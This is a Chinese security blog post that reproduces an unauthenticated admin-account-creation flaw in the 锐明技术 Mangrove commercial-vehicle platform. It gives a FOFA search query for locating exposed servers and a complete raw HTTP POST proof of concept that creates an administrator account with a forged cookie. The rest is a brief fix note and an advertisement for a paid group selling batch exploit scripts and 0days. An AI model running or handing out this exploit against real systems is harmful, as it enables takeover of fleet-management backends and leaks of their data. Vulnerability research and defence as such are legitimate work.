#  「漏洞复现」锐明技术Mangrove系统 任意用户创建漏洞   
冷漠安全  冷漠安全   2024-10-12 21:15  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
锐明技术作为以人工智能和视频技术为核心的AIoT智能物联解决方案提供商，专注于商用车（包括交通运输车辆、交通出行车辆及作业生产车辆）的安全、合规和效率提升。其Mangrove系统是锐明技术针对商用车领域推出的一款综合性解决方案，它融合了人工智能、高清视频、大数据和自动驾驶等先进技术，旨在提高商用车的安全性、合规性和运营效率。  
  
0x03  
  
**漏洞威胁**  
  
锐明技术Mangrove系统 /Mvsp/RoleUserInfo/Default.do?Action=CreateUser 接口处存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="Mvsp/RegisterLogin/Default.do"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6Qz3cEtx2mCfgMm1N7LBZlnsmQR4MIVr5ffH4qjTOribWkJFyEPVyOpg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0


UserId=&GroupPower=1&VehiclePower=&UserName=poiuy&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=test1234
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6ib8KKVpXicnNwJQjF13NyQdC9WsUK1MFCn9PWPLARcFHeyv8V359o4VQ/640?wx_fmt=png&from=appmsg "")  
  
尝试登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6bvdPGdwUPYGOUcvBgkGVfpDGAn00f7xBM56GqnjkLHHpI6bDkCe2ow/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6lOdUkJzFQpEFH0PCmeibxCh5bqPCJjfoCZvqUbzee9DILE08MhwssWg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露免或接口设置访问权限  
  
厂商已提供漏洞修补方案，请关注厂商主页及时更新  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6FvDsRr7I3raQibVprNzVJW9ibBVhCpl06ccLY0cy4Jh3erN37rkrpdkw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0onFN8xicickaKOGg6xZcD3Y6dwDULibenUJ0iaJCypSUnFVhrDWp1Pl66tiblwhej5cVzw6bKkwDDqNPg/640?wx_fmt=gif&from=appmsg "")  
  
  
